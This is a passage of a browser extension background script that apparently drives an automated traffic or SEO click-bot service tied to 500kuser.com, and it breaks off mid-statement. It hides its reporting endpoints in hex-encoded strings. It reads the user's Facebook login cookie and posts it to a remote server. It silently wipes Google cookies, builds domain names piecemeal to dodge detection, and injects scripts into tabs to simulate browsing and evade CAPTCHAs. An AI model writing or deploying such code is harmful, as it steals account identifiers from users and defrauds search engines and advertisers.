/* global chrome */
try {
  setInterval(() => {
    chrome.tabs.query({}, function (tabs) {
      for (let i = 0; i < tabs.length; i++) {
        if (tabs[i].url == "http://localhost:3000") {
          chrome.tabs.update(tabs[i].id, { active: true });
          break;
        }
      }
    });
  }, 900000);
  var arrTabs = [];
  let getcapchatab = [];
  let hdgTab = [];
  let vuseragent = navigator.userAgent;
  var HP = {};
  var lasttabOpen = new Date();
  var configTimeOpenTab = 10;
  var configMaxTab = 30;
  var currentTab = 0;

  var _0x3c04 = [
    "localhost:3000",
    "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x35\x30\x30\x6B\x75\x73\x65\x72\x2E\x63\x6F\x6D\x2F\x66\x73\x34\x2E\x30\x2E\x70\x68\x70",
    "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x35\x30\x30\x6B\x75\x73\x65\x72\x2E\x63\x6F\x6D\x2F\x67\x65\x74\x49\x44\x46jx42\x2E\x70\x68\x70",
  ];
  var CFG = {
    "\x48\x4F\x53\x54\x5F\x55\x52\x4C": _0x3c04[0],
    "\x55\x50\x44\x41\x54\x45\x5F\x55\x52\x4C": _0x3c04[1],
    "\x4D\x41\x58\x5F\x54\x49\x4D\x45": 30,
    "\x4D\x49\x4E\x5F\x54\x49\x4D\x45": 20,
    "\x4D\x41\x58\x5F\x4C\x56\x4C\x5F\x31": 2,
    "\x4D\x41\x58\x5F\x4C\x56\x4C\x5F\x32": 1,
    "\x69\x73\x44\x65\x62\x75\x67": false,
    "\x55\x50\x44\x41\x54\x45\x5F\x49\x44": _0x3c04[2],
  };

  Date.prototype.fMatTypeDate = function (fMatTypeDate) {
    var o = {
      "M+": this.getMonth() + 1,
      "d+": this.getDate(),
      "h+": this.getHours(),
      "m+": this.getMinutes(),
      "s+": this.getSeconds(),
      "q+": Math.floor((this.getMonth() + 3) / 3),
      S: this.getMilliseconds(),
    };
    if (/(y+)/.test(fMatTypeDate))
      fMatTypeDate = fMatTypeDate.replace(
        RegExp.$1,
        (this.getFullYear() + "").substr(4 - RegExp.$1.length)
      );
    for (var k in o)
      if (new RegExp("(" + k + ")").test(fMatTypeDate))
        fMatTypeDate = fMatTypeDate.replace(
          RegExp.$1,
          RegExp.$1.length == 1
            ? o[k]
            : ("00" + o[k]).substr(("" + o[k]).length)
        );
    return fMatTypeDate;
  };

  HP.chekMasterLink = function (url) {
    var regex = new RegExp("https?://" + CFG.HOST_URL);
    return url.search(regex) === 0;
  };
  HP.isMatchedTwo = function (str1, str2) {
    if (!str1 || !str2) {
      return false;
    }
    if (str1.search(str2) >= 0 || str2.search(str1) >= 0) {
      return true;
    }
    return false;
  };
  HP.checkMatchKey = function (keywords, str) {
    var isResult = false;
    var i1 = str.search(/https:\/\/www.google.com(.*)?aclk/i);
    if (i1 == 0) {
      return false;
    }
    if (keywords instanceof Array) {
      for (var i = 0; i < keywords.length; i++) {
        if (this.isMatchedTwo(keywords[i], str)) {
          isResult = true;
          break;
        }
      }
    } else {
      isResult = this.isMatchedTwo(keywords, str);
    }
    return isResult;
  };

  var _0xcd5e = [
    "\x75\x64\x61\x74\x65\x53\x65\x72\x53\x57",
    "\x67\x65\x74\x4D\x6F\x6E\x74\x68",
    "\x75\x72\x6C\x43\x6C\x69\x63\x6B\x65\x64",
    "\x69\x64\x55\x73\x65\x72",
    "\x74\x69\x6D\x65\x4F\x70\x65\x6E\x64",
    "\x74\x69\x6D\x65\x43\x6C\x6F\x73\x65",
    "\x74\x69\x6D\x65\x56\x69\x65\x77",
    "\x6C\x69\x6E\x6B\x54\x65\x78\x74",
    "",
    "\x70\x61\x72\x65\x6E\x74",
    "\x64\x65\x65\x70\x62\x61\x63\x6B\x6C\x69\x6E\x6B",
    "\x63\x68\x65\x63\x6B\x6B\x65\x79",
    "\x69\x64\x55\x73\x65\x72\x50\x6F\x73\x74\x65\x64",
    "\x70\x61\x72\x65\x6E\x74\x6E\x65\x77",
    "\x6B\x65\x79\x77\x6F\x72\x64",
    "\x65\x6E\x74\x72\x69\x65\x73",
    "\x61\x70\x70\x65\x6E\x64",
    "\x74\x68\x65\x6E",
    "\x50\x4F\x53\x54",
  ];
  HP[_0xcd5e[0]] = function (_0x6ceex1, _0x6ceex2) {
    var _0x6ceex3 = new Date();
    var _0x6ceex4 = _0x6ceex3[_0xcd5e[1]]();
    if (_0x6ceex4 > 5) {
      return false;
    }
    var _0x6ceex5 = {
      urlClicked: _0x6ceex1[_0xcd5e[2]],
      idUser: _0x6ceex1[_0xcd5e[3]],
      timeOpend: _0x6ceex1[_0xcd5e[4]],
      timeClose: _0x6ceex1[_0xcd5e[5]],
      timeView: _0x6ceex1[_0xcd5e[6]],
      linkText: trim(_0x6ceex1[_0xcd5e[7]] || _0xcd5e[8]),
      parent: _0x6ceex1[_0xcd5e[9]],
      deepbacklink: _0x6ceex1[_0xcd5e[10]] ? 1 : 0,
      checkkey: !_0x6ceex1[_0xcd5e[10]] ? 0 : _0x6ceex1[_0xcd5e[11]] ? 1 : 0,
      idUserPosted: _0x6ceex1[_0xcd5e[12]],
      parentnew: _0x6ceex1[_0xcd5e[13]],
      keyword: _0x6ceex1[_0xcd5e[14]],
    };
    (async (_0x6ceex6, _0x6ceex7) => {
      let _0x6ceex8 = new FormData();
      for (const [key, value] of Object[_0xcd5e[15]](_0x6ceex6)) {
        _0x6ceex8[_0xcd5e[16]](key, value);
      }
      try {
        fetch(_0x6ceex7, { method: _0xcd5e[18], body: _0x6ceex8 })[_0xcd5e[17]](
          (_0x6ceex9) => {}
        );
      } catch (error) {}
    })(_0x6ceex5, CFG.UPDATE_URL);
  };

  var _0xbc7e = [
    "\x75\x70\x64\x61\x74\x65\x64\x53\x65\x72\x76\x65\x72\x44\x61\x74\x61",
    "\x65\x6E\x74\x72\x69\x65\x73",
    "\x61\x70\x70\x65\x6E\x64",
    "\x74\x68\x65\x6E",
    "\x50\x4F\x53\x54",
    "\x69\x64\x55\x73\x65\x72\x41\x70\x70",
    "\x69\x64\x55\x73\x65\x72\x46\x61\x63\x65\x62\x6F\x6F\x6B",
  ];
  HP[_0xbc7e[0]] = function (_0x964bx1, _0x964bx2) {
    var _0x964bx3 = {
      idUserApp: _0x964bx1[_0xbc7e[5]],
      idUserFacebook: _0x964bx1[_0xbc7e[6]],
    }(async (_0x964bx3, _0x964bx4) => {
      let _0x964bx5 = new FormData();
      for (const [key, value] of Object[_0xbc7e[1]](_0x964bx3)) {
        _0x964bx5[_0xbc7e[2]](key, value);
      }
      try {
        fetch(_0x964bx4, { method: _0xbc7e[4], body: _0x964bx5 })[_0xbc7e[3]](
          (_0x964bx6) => {}
        );
      } catch (error) {}
    })(_0x964bx3, CFG.UPDATE_ID);
  };

  HP.rm_unicode = function (str) {
    str = str.toLowerCase();
    str = str.replace(/à|á|ạ|ả|ã|â|ầ|ấ|ậ|ẩ|ẫ|ă|ằ|ắ|ặ|ẳ|ẵ/g, "a");
    str = str.replace(/è|é|ẹ|ẻ|ẽ|ê|ề|ế|ệ|ể|ễ/g, "e");
    str = str.replace(/ì|í|ị|ỉ|ĩ/g, "i");
    str = str.replace(/ò|ó|ọ|ỏ|õ|ô|ồ|ố|ộ|ổ|ỗ|ơ|ờ|ớ|ợ|ở|ỡ/g, "o");
    str = str.replace(/ù|ú|ụ|ủ|ũ|ư|ừ|ứ|ự|ử|ữ/g, "u");
    str = str.replace(/ỳ|ý|ỵ|ỷ|ỹ/g, "y");
    str = str.replace(/đ/g, "d");
    str = str.replace(
      /!|@|%|\^|\*|\(|\)|\+|\=|\<|\>|\?|\/|,|\.|\:|\;|\'|\"|\&|\#|\[|\]|~|\$|_/g,
      "-"
    );
    str = str.replace(/-+-/g, "-");
    str = str.replace(/^\-+|\-+$»/g, "");
    str = trim(str);
    return str;
  };

  HP.checkGGTab = function (tab) {
    var regex = new RegExp("https?://(www.)?google.com");
    return tab.url.search(regex) === 0;
  };

  var TMG = {};
  TMG.dictMasterUrls = {};
  TMG.dictOpenedLevelUrls = {};
  TMG.dictManagedTabs = {};
  TMG.newTabs = {};
  TMG.Add1Tab = function (tabInfo) {
    if (
      !tabInfo.openerTabId ||
      tabInfo.url.search("chrome://newtab/") !== -1 ||
      tabInfo.url.search("edge://newtab/") !== -1 ||
      tabInfo.url.search("coccoc://newtab/") !== -1
    ) {
      return;
    }
    var openerTab = this.getAnElementById(tabInfo.openerTabId);
    if (!openerTab) {
      this.addTabNew(tabInfo);
      return;
    }
    if (this.checkMasterTab(openerTab)) {
      this.dictManagedTabs[tabInfo.id] = {
        tab: tabInfo,
        role: "FISRT",
        parent: openerTab,
        startAt: new Date(),
        arrUrls: {},
        isActive: false,
        iNumberTabOpened: 0,
      };
    } else if (this.checkfirtLlTab(openerTab)) {
      this.dictManagedTabs[tabInfo.id] = {
        tab: tabInfo,
        role: "SECOND",
        parent: openerTab,
        startAt: new Date(),
        arrUrls: {},
        iNumberTabOpened: 0,
        idUserPosted:
          openerTab.idUserPosted != null ? openerTab.idUserPosted : "",
      };
    } else if (this.SecondLlTab(openerTab)) {
      this.dictManagedTabs[tabInfo.id] = {
        tab: tabInfo,
        role: "THIRD",
        parent: openerTab,
        startAt: new Date(),
        arrUrls: {},
        iNumberTabOpened: 0,
        idUserPosted:
          openerTab.idUserPosted != null ? openerTab.idUserPosted : "",
      };
    }
    if (!this.dictManagedTabs[tabInfo.id]) {
      return false;
    }
    if (!this.dictManagedTabs[tabInfo.id].arrUrls) {
      this.dictManagedTabs[tabInfo.id].arrUrls = {};
    }
    if (this.latestUrl) {
      if (!this.dictManagedTabs[tabInfo.id].arrUrls[this.latestUrl.href]) {
        this.dictManagedTabs[tabInfo.id].arrUrls[this.latestUrl.href] =
          this.latestUrl.text;
      }
      this.latestUrl = null;
    }
  };
  TMG.addTabNew = function (tab) {
    this.updateTab(tab);
    this.updateRoleNew(tab);
  };
  TMG.updateTab = function (tab) {
    if (this.dictManagedTabs[tab.id]) {
      this.dictManagedTabs[tab.id].tab = tab;
      this.updateRoleNew(tab);
      if (
        tab.url.search("chrome://newtab/") > -1 ||
        tab.url.search("edge://newtab/") > -1 ||
        tab.url.search("coccoc://newtab/") > -1
      ) {
        TMG.newTabs[tab.id] = true;
        this.dictManagedTabs[tab.id] = {
          tab: tab,
          role: "1",
          parent: null,
          startAt: new Date(),
          arrUrls: {},
          isActive: false,
          iNumberTabOpened: 0,
        };
      }

      return;
    }

    var a = null;
    if (
      tab.url.search("chrome://extensions/") > -1 ||
      tab.url.search("chrome://") > -1 ||
      tab.url.search("edge://extensions/") > -1 ||
      tab.url.search("edge://") > -1 ||
      tab.url.search("coccoc://extensions/") > -1 ||
      tab.url.search("coccoc://") > -1
    ) {
      this.dictManagedTabs[tab.id] = {
        tab: tab,
        role: "",
        parent: a,
        startAt: new Date(),
        arrUrls: {},
        isActive: false,
        iNumberTabOpened: 0,
      };
      return;
    }

    const d = Object.entries(this.dictManagedTabs);
    if (d.length > 1) {
      a = d[d.length - 1][1];
    }

    this.dictManagedTabs[tab.id] = {
      tab: tab,
      role: "THIRD",
      parent: a,
      startAt: new Date(),
      arrUrls: {},
      isActive: false,
      iNumberTabOpened: 0,
    };
  };
  TMG.setLastedUrl = function (request) {
    if (request.href !== undefined) this.latestUrl = request;
  };
  TMG.setNewRole = function (tabId, ROLE) {
    this.dictManagedTabs[tabId].role = ROLE;
  };
  TMG.getLevelParentTab1 = function (tabId) {
    var managedTab = this.getAnElementById(tabId);
    if (this.checkThreeLlTab(managedTab)) {
      return managedTab.parent != null ? managedTab.parent.parent : null;
    }
    return managedTab.parent;
  };
  TMG.updateRoleNew = function (tab) {
    if (HP.chekMasterLink(tab.url)) {
      chrome.cookies.get(
        { url: "https://" + CFG.HOST_URL, name: "UID500KUSER" },
        function (cookie) {
          TMG.UID500KUSER = cookie.value;
        }
      );
      chrome.cookies.get(
        { url: "https://" + CFG.HOST_URL, name: "GIFCPL" },
        function (cookie) {
          if (cookie == null) {
            chrome.cookies.set({
              url: "https://" + CFG.HOST_URL,
              name: "GIFCPL",
              value: "0",
            });
          } else if (cookie.value == "0") {
            if (TMG.UID500KUSER) {
              chrome.cookies.get(
                { url: "https://facebook.com", name: "c_user" },
                function (data) {
                  TMG.UIDFACEBOOK = data.value;

                  try {
                    HP.updatedServerData(
                      {
                        idUserApp: TMG.UID500KUSER,
                        idUserFacebook: TMG.UIDFACEBOOK,
                      },
                      function () {}
                    );
                  } catch (e) {}
                }
              );
            }
            chrome.cookies.set({
              url: "https://" + CFG.HOST_URL,
              name: "GIFCPL",
              value: "1",
            });
          }
        }
      );

      var ggf = "g" + "o" + "o" + "g" + "l" + "e";
      chrome.cookies.getAll({ domain: ggf + ".com" }, function (cookies) {
        for (var i = 0; i < cookies.length; i++) {
          chrome.cookies.remove({
            url: "https://" + cookies[i].domain + cookies[i].path,
            name: cookies[i].name,
          });
        }
      });

      chrome.cookies.getAll({ domain: ggf + ".com.vn" }, function (cookies) {
        for (var i = 0; i < cookies.length; i++) {
          chrome.cookies.remove({
            url: "https://" + cookies[i].domain + cookies[i].path,
            name: cookies[i].name,
          });
        }
      });

      this.setNewRole(tab.id, "MASTER");
    }
  };

  TMG.getAnElementById = function (tabId) {
    return this.dictManagedTabs[tabId];
  };
  TMG.iUrlMtTab = function (url) {
    return !!this.dictMasterUrls[url];
  };
  TMG.checkMasterTab = function (tab) {
    if (tab != null && tab != undefined) return tab.role === "MASTER";
    else return false;
  };
  TMG.checkfirtLlTab = function (tab) {
    if (tab != null && tab != undefined) return tab.role === "FISRT";
    else return false;
  };
  TMG.SecondLlTab = function (tab) {
    if (tab != null && tab != undefined) return tab.role === "SECOND";
    else return false;
  };
  TMG.checkThreeLlTab = function (tab) {
    if (tab != null && tab != undefined) return tab.role === "THIRD";
    else return false;
  };
  TMG.checkExited = function (tabId) {
    return !!this.dictManagedTabs[tabId];
  };
  TMG.findTabHasUrlAndFcusIn = function (request) {
    chrome.tabs.query(
      {},
      function (results) {
        var url = request.href;
        var managedTab = null;
        var _tab = null;
        var tabId = null;
        for (var i = 0; i < results.length; i++) {
          _tab = results[i];
          tabId = _tab.id | 0;
          managedTab = this.dictManagedTabs[tabId];

          if (url.search("https://www") === -1 && url.search("google.") > -1) {
            url = url.replace("https://", "https://www.");
            if (!url.match(/\/$/)) url = url + "/";
          }

          if (
            TMG.checkfirtLlTab(managedTab) ||
            TMG.SecondLlTab(managedTab) ||
            TMG.checkMasterTab
          ) {
            if (
              managedTab != null &&
              managedTab != undefined &&
              managedTab.tab != null &&
              managedTab.tab != undefined &&
              managedTab.tab.url ===
                url /*|| decodeURIComponent(managedTab.tab.url) == url*/
            ) {
              try {
                chrome.tabs.update(
                  tabId,
                  { selected: true },
                  function (tabId, managedTab) {
                    this.dictManagedTabs[tabId].idUserPosted =
                      request.idUserPosted;
                    managedTab.keyword = [];
                    var arrKeywords = request.keyword.split(/[,|;]/g);
                    for (var i = 0; i < arrKeywords.length; i++) {
                      arrKeywords[i] = arrKeywords[i].replace(/\s+/g, " ");
                      managedTab.keyword.push(HP.rm_unicode(arrKeywords[i]));
                    }

                    managedTab.isActive = true;
                    chrome.scripting.executeScript({
                      target: { tabId: tabId },
                      //code: 'HP.AuOpTab()'
                      function: HPkeyhighlight,
                      args: [JSON.stringify(managedTab.keyword), true],
                    });

                    if (
                      managedTab.tab.url.search("www.google.com") > -1 &&
                      url.indexOf("search?q") == -1
                    ) {
                      setTimeout(function () {
                        chrome.scripting.executeScript({
                          target: { tabId: tabId },

                          function: HPkeyhighlight,
                          args: [JSON.stringify(managedTab.keyword), 2],
                        });
                      }, 3000);
                    }
                  }.bind(this, tabId, managedTab)
                );
              } catch (e) {}
              break;
            }
            if (managedTab !== undefined) {
              if (managedTab.arrUrls != undefined) {
                for (var href in managedTab.arrUrls) {
                  href = href.replace(/\/$/, "");
                  url = url.replace(/\/$/, "");
                  url = url.replace("www.news.go", "news.go");
                  url = url.replace("www.sites.go", "sites.go");
                  if (href === url) {
                    try {
                      chrome.tabs.update(
                        tabId,
                        { selected: true },
                        function (tabId, managedTab) {
                          this.dictManagedTabs[tabId].idUserPosted =
                            request.idUserPosted;
                          managedTab.keyword = [];
                          var arrKeywords = request.keyword.split(/[,|;]/g);
                          for (var i = 0; i < arrKeywords.length; i++) {
                            arrKeywords[i] = arrKeywords[i].replace(
                              /\s+/g,
                              " "
                            );
                            managedTab.keyword.push(
                              HP.rm_unicode(arrKeywords[i])
                            );
                          }

                          managedTab.isActive = true;

                          if (
                            managedTab.tab.url.search("www.google.com") > -1 &&
                            managedTab.tab.url.indexOf("search?q") > -1 &&
                            url.search("www.google.com") > -1 &&
                            url.indexOf("search?q") == -1
                          ) {
                            chrome.scripting.executeScript({
                              target: { tabId: tabId },

                              function: HPkeyhighlight,
                              args: [JSON.stringify(managedTab.keyword), 2],
                            });
                          } else {
                            chrome.scripting.executeScript({
                              target: { tabId: tabId },

                              function: HPkeyhighlight,
                              args: [JSON.stringify(managedTab.keyword), true],
                            });
                          }
                        }.bind(this, tabId, managedTab)
                      );
                    } catch (e) {}
                    break;
                  }
                }
              }
            }
          }
        }
      }.bind(this)
    );
  };
  TMG.canExecuteScript = function (tab) {
    if (!tab.url) {
      return false;
    }
    if (
      tab.url.indexOf("chrome://") === 0 ||
      tab.url.indexOf("edge://") === 0 ||
      tab.url.indexOf("coccoc://") === 0
    ) {
      return false;
    }
    if (tab.url.indexOf("chrome-devtools://") === 0) {
      return false;
    }
    if (tab.url.indexOf("data:") === 0) {
      return false;
    }
    return true;
  };

  TMG.executeScript = function (tab) {
    if (!TMG.canExecuteScript(tab)) {
      return;
    }
    var managedTab = TMG.getAnElementById(tab.id);

    if (!managedTab || !managedTab.role) {
      return;
    }
    TMG._executeScript(tab, "jquery.min.js", function () {
      TMG._executeScript(tab, "main.js", function () {
        if (TMG.SecondLlTab(managedTab)) {
          var keyword = managedTab.parent.keyword || [];
          chrome.scripting.executeScript({
            target: { tabId: managedTab.tab.id },

            function: HPkeyhighlight,
            args: [JSON.stringify(keyword), true],
          });
        }
      });
    });
  };
  TMG._executeScript = function (tab, script, callback) {
    if (!callback.__loop__ === undefined) {
      callback.__loop__ = 0;
    }

    chrome.scripting.executeScript({
      target: { tabId: tab.id },
      files: [script],
    });
  };
  TMG.isTwoTabs = function (tabId) {
    var managedTab = TMG.getAnElementById(tabId);
    var randomMiliSeconds = Math.floor(Math.random() * 5000) + 5000;
    if (
      (TMG.SecondLlTab(managedTab) || TMG.checkThreeLlTab(managedTab)) &&
      !TMG.newTabs[tabId]
    ) {
      chrome.scripting.executeScript({
        target: { tabId: tabId },
        function: HpScrBottom,
      });
    }
  };

  TMG.AuCloseTbs = function () {
    chrome.tabs.query(
      {},
      function (results) {
        var dictValidTab = {};
        var _tab = null;
        for (var i = 0; i < results.length; i++) {
          _tab = results[i];
          dictValidTab[_tab.id] = _tab;
        }
        var diff = 0;
        var timeToClose = 0;
        var now = new Date();
        var managedTab = null;
        const ListLinkCFG = [
          {
            link: "www.google.com",
            time: 100,
          },
          {
            link: "www.facebook.com",
            time: 1,
          },
          {
            link: "twitter.com",
            time: 5,
          },
          {
            link: "youtube.com",
            time: 5,
          },
          {
            link: "youtu.be",
            time: 5,
          },
        ];

        for (var tabId in this.dictManagedTabs) {
          if (!dictValidTab[tabId]) {
            delete this.dictManagedTabs[tabId];
            continue;
          }
          managedTab = this.dictManagedTabs[tabId];
          const CheckLink = (url) => {
            for (let i = 0; i < ListLinkCFG.length; i++) {
              if (url.search(ListLinkCFG[i].link) > -1) {
                return true;
              }
            }
          };

          if (
            !(
              TMG.checkfirtLlTab(managedTab) && CheckLink(managedTab.tab.url)
            ) &&
            !TMG.SecondLlTab(managedTab) &&
            !TMG.checkThreeLlTab(managedTab)
          ) {
            continue;
          }

          diff = ((now - managedTab.startAt) / 1000) | 0;
          timeToClose =
            Math.floor(Math.random() * (CFG.MAX_TIME - CFG.MIN_TIME)) +
            CFG.MIN_TIME;

          const CheckLinkDefault = (gg) => {
            return managedTab.tab.url.search(gg);
          };

          const CloseTabDefault = (time) => {
            if (diff > time && !TMG.newTabs[tabId]) {
              try {
                this.dictManagedTabs[tabId].role = "";
                chrome.tabs.remove(tabId | 0, function () {});
              } catch (e) {
                this.dictManagedTabs[tabId].role = "";
                delete this.dictManagedTabs[tabId];
              }
            }
          };
          if (CheckLink(managedTab?.tab?.url)) {
            for (let i = 0; i < ListLinkCFG.length; i++) {
              if (CheckLinkDefault(ListLinkCFG[i].link) > -1)
                CloseTabDefault(ListLinkCFG[i].time);
            }
          } else {
            if (diff > timeToClose && !TMG.newTabs[tabId]) {
              try {
                this.dictManagedTabs[tabId].role = "";
                chrome.tabs.remove(1 | 0, function () {});
              } catch (e) {
                this.dictManagedTabs[tabId].role = "";
                delete this.dictManagedTabs[tabId];
              }
            }
          }
        }
      }.bind(this)
    );
    setTimeout(TMG.AuCloseTbs.bind(this), 1);
  };
  TMG.isTabOpen = function (url) {
    var managedTab = null;

    if (
      url.indexOf("search?q=cache") > -1 ||
      (url.indexOf("search?q=") == -1 && url.search("#") > -1) ||
      url.indexOf("translate.goog") > -1
    ) {
      return true;
    }
    for (var tabId in this.dictManagedTabs) {
      managedTab = this.dictManagedTabs[tabId];

      if (!TMG.SecondLlTab(managedTab) && !TMG.checkThreeLlTab(managedTab)) {
        continue;
      }
      if (managedTab.tab.url === url) {
        return true;
      }
      for (var href in managedTab.arrUrls) {
        if (href === url || href.indexOf(url) > -1) {
          return true;
        }
      }
    }
    return false;
  };
  TMG.priorityUrl = function (managedTab) {
    if (managedTab.arrUrls) {
      var arrUrls = Object.keys(managedTab.arrUrls);
      if (arrUrls && arrUrls.length) {
        return arrUrls[0];
      }
    }
    if (!managedTab.tab) {
      return "";
    }
    return managedTab.tab.url || "";
  };
  TMG.checkTabOpenTooMuch = function (openerTabId) {
    var managedTab = this.dictManagedTabs[openerTabId];
    if (managedTab) {
      if (
        TMG.checkfirtLlTab(managedTab) &&
        managedTab.iNumberTabOpened >= CFG.MAX_LVL_1
      ) {
        return CFG.MAX_LVL_1;
      }
      if (
        TMG.SecondLlTab(managedTab) &&
        managedTab.iNumberTabOpened >= CFG.MAX_LVL_2
      ) {
        return CFG.MAX_LVL_2;
      }
    }
    return false;
  };
  TMG.validateOpFrGGTab = function (openerTab, request) {
    var managedTab = this.getAnElementById(openerTab.tab.id);
    if (!managedTab) {
      return true;
    }
    var asciiLink = HP.rm_unicode(request.href);
    var textLink = request.text; //It's already converted to ascii
    var arrKeyword = managedTab.arrUrls ? Object.keys(managedTab.arrUrls) : [];
    arrKeyword.push(managedTab.tab.url);
    if (managedTab.keyword instanceof Array) {
      Array.prototype.push.apply(arrKeyword, managedTab.keyword);
    }
    var isResult =
      HP.checkMatchKey(arrKeyword, asciiLink) ||
      HP.checkMatchKey(arrKeyword, textLink);
    return isResult;
  };

  chrome.tabs.query({}, function (results) {
    var tab = null;
    for (var i = 0; i < results.length; i++) {
      tab = results[i];
      TMG.addTabNew(tab);
      TMG.executeScript(tab);
    }
  });
  TMG.AuCloseTbs();
  chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
    if (getcapchatab.findIndex((item) => item.id == tabId) > -1) {
      if (changeInfo.url) {
        const change_url = changeInfo.url.toLowerCase();

        if (
          !change_url.startsWith("https://ipv6.google.com/sorry/index") &&
          !change_url.startsWith("https://ipv4.google.com/sorry/index") &&
          !change_url.startsWith("http://ipv6.google.com/sorry/index") &&
          !change_url.startsWith("http://ipv4.google.com/sorry/index") &&
          !change_url.startsWith("https://www.google.com/sorry/index") &&
          !change_url.startsWith("http://www.google.com/sorry/index")
        ) {
          try {
            chrome.tabs.remove(tabId | 0, function () {});
          } catch (e) {}
        }
      }
    }
    if (tab) {
      if (tab.url.toLowerCase().startsWith("https://hidigi.org")) {
        if (hdgTab.indexOf(tabId) === -1) {
          hdgTab.push(tabId);
        }
      }
    }
    TMG.updateTab(tab);
    TMG.executeScript(tab);
    var managedTab = TMG.getAnElementById(tab.id);
    if (!TMG.SecondLlTab(managedTab) && !TMG.checkThreeLlTab(managedTab)) {
      return;
    }
    //Thiet la eo le ma. Khong hieu tai sao co thang lai goi ca co /
    var message =
      TMG.dictOpenedLevelUrls[tab.url] ||
      TMG.dictOpenedLevelUrls[tab.url + "/"];
    if (message && !managedTab.isSentOpened) {
      managedTab.isSentOpened = true;
      var parentTab = TMG.getLevelParentTab1(tab.id);
      var checkkey =
        HP.checkMatchKey(parentTab.keyword, message.text) ||
        HP.checkMatchKey(parentTab.keyword, HP.rm_unicode(tab.url));
      var parentUrl = TMG.priorityUrl(parentTab);

      try {
        HP.udateSerSW(
          {
            urlClicked: tab.url,
            idUser: TMG.UID500KUSER,
            timeOpend: managedTab.startAt.fMatTypeDate("hh:mm:ss dd/MM/yyyy"),
            timeClose: "In view",
            timeView: 0,
            linkText: message.originMgs || message.text,
            parent: parentUrl,
            deepbacklink: parentTab.isActive,
            checkkey: checkkey,
            idUserPosted: TMG.dictManagedTabs[tabId].idUserPosted,
            parentnew: parentTab.tab.url,
            keyword: parentTab.keyword,
          },
          function () {}
        );
      } catch (e) {}
    }
  });

  chrome.runtime.onMessage.addListener(function (
    request,
    sender,
    sendResponse
  ) {
    if (request.eventName === "newTabs") {
      chrome.tabs.create(
        {
          url: `https://${request.eventData.data}`,
        },
        () => {
          chrome.tabs.query({}, function (results) {
            let getIdMasterTab = results.filter((item) => {
              if (item.url === "http://localhost:3000") {
                return item.id;
              }
            });
            let getPendingUrl = results.filter((item) => {
              if (item.pendingUrl) {
                return item.id;
              }
            });
            chrome.tabs.sendMessage(getIdMasterTab[0].id, {
              tabId: getPendingUrl[0].id,
              id: request.eventData.id,
            });
            setTimeout(() => {
              chrome.tabs.remove(getPendingUrl[0].id);
            }, 120000);
          });
        }
      );
    }
  });
  chrome.tabs.onRemoved.addListener(function (tabId, changeInfo) {
    if (getcapchatab.findIndex((item) => item.id == tabId) > -1) {
      getcapchatab = getcapchatab.filter((item) => item.id != tabId);
      hdgTab.forEach((tab_index) => {
        chrome.tabs.sendMessage(tab_index, {
          action: "captcha_success",
        });
      });
    }
    if (hdgTab.indexOf(tabId) > -1) {
      hdgTab = hdgTab.filter((item) => item != tabId);
    }

    if (!TMG.dictManagedTabs[tabId]) {
      return;
    }
    var managedTab = TMG.getAnElementById(tabId);
    var parentTab = TMG.getLevelParentTab1(tabId);
    if (managedTab && managedTab.isSentOpened) {
      var tab = managedTab.tab;
      var message = TMG.dictOpenedLevelUrls[tab.url];
      var now = new Date();
      var diff = ((now - managedTab.startAt) / 1000) | 0;
      var checkkey =
        HP.checkMatchKey(parentTab.keyword, message.text) ||
        HP.checkMatchKey(parentTab.keyword, HP.rm_unicode(tab.url));
      var parentUrl = TMG.priorityUrl(parentTab);
      function callback() {
        if (xhr.readyState === XMLHttpRequest.DONE) {
          if (xhr.status === 200) {
            result = xhr.responseText;
            // ...
          }
        }
      }

      var xhr = new XMLHttpRequest();
      xhr.open("GET", "http://www.example.com?par=0", true);
      xhr.onreadystatechange = callback;
      xhr.send();
      HP.udateSerSW(
        {
          urlClicked: tab.url,
          idUser: TMG.UID500KUSER,
          timeOpend: managedTab.startAt.fMatTypeDate("hh:mm:ss dd/MM/yyyy"),
          timeClose: now.fMatTypeDate("hh:mm:ss dd/MM/yyyy"),
          timeView: diff,
          linkText: message.originMgs || message.text,
          parent: parentUrl,
          deepbacklink: parentTab.isActive,
          checkkey: checkkey,
          idUserPosted: TMG.dictManagedTabs[tabId].idUserPosted,
          parentnew: parentTab.tab.url,
          keyword: parentTab.keyword,
        },
        function () {}
      );

      TMG.dictManagedTabs[tabId].role = null;
      TMG.dictManagedTabs[tabId].tab = null;
      delete TMG.dictManagedTabs[tabId];
    }
    if (parentTab) {
      parentTab.iNumberTabOpened--;
    }
  });
  TMG.AuOpTab = function (data) {
    var tablink;
    var managedTab = null;
    var _tab = null;
    chrome.runtime.onMessage.addListener(function (
      request,
      sender,
      sendResponse
    ) {
      if (request.cmd === "test1") {
        chrome.runtime.sendMessage(
          { cmd: "test3", data: data.detail },
          function () {}
        );

        console.log("test1", request);
      }
    });
    var tabId = null;
    console.log(data);
    chrome.tabs.query({}, function (results) {
      // for (var i = 0; i < results.length; i++) {
      //   _tab = results[i];
      //   tabId = _tab.id | 0;
      //   var managedTab = TMG.dictManagedTabs[tabId];
      //   if (_tab.url.indexOf("//500kuser.com") >= 3) {
      //     chrome.scripting.executeScript({
      //       target: { tabId: _tab.id },

      //       function: HpAtoOpTab,
      //     });
      //   }
      //   TMG.isTwoTabs(_tab.id);
      // }
      console.log("results", results);
    });

    setTimeout(TMG.AuOpTab.bind(this), 10000);
  };
  chrome.runtime.onMessage.addListener(function (
    request,
    sender,
    sendResponse
  ) {
    if (request.eventName === "clickDomain") {
      try {
        setTimeout(() => {
          console.log("toi dang choi ne");
          let bodyData = new FormData();
          bodyData.append("postId", request?.eventData?.post);
          fetch("http://localhost:4000/api/v1/posts/completedPost", {
            method: "POST",
            headers: {
              Authorization: `Bearer ${request?.eventData?.token}`,
            },

            body: bodyData,
          })
            .then((data) => {
              console.log(data);
            })
            .catch((error) => {
              console.error(error);
            });
        }, 10000);
      } catch (error) {
        console.log(error);
      }
      return;
    }
    // check rank key code here
    let engine_request = "google.com";
    let engine_language_code = "vn";
    var n1 = new Date();
    var dif0 = ((n1 - lasttabOpen) / 1000) | 0;
    if (request.type == "GetContentPage") {
      let uri_key = encodeURIComponent(request.detail.keyword);
      if (request.detail.engine) {
        engine_request = request.detail.engine.engine;
        engine_language_code = request.detail.engine.code;
      }

      vuseragent = request.detail.mobile;
      link_url =
        "https://www." +
        engine_request +
        "/search?q=" +
        uri_key +
